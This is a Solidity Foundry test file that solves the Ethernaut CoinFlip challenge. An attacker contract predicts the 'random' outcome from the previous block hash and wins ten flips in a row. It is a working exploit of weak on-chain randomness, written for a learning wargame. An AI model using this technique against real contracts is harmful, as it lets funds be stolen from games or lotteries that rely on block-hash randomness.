// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/CoinFlip.sol";

contract MiddleMan {
    function attack(address prey) public {
        bool answer = get_answer();
        CoinFlip(prey).flip(answer);
    }

    function get_answer() public view returns (bool) {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1;
    }
}

// use the same formula to produce the answer
contract CoinFlipTest is Test {
    CoinFlip instance;

    function setUp() public {
        instance = new CoinFlip();
    }

    function testFlip() public {
        MiddleMan middleMan = new MiddleMan();
        for (uint256 i = 0; i < 10; i++) {
            middleMan.attack(address(instance));
            assertEq(instance.consecutiveWins(), i + 1);

            vm.roll(block.number + 1);
        }
        assertEq(instance.consecutiveWins(), 10);
    }
}
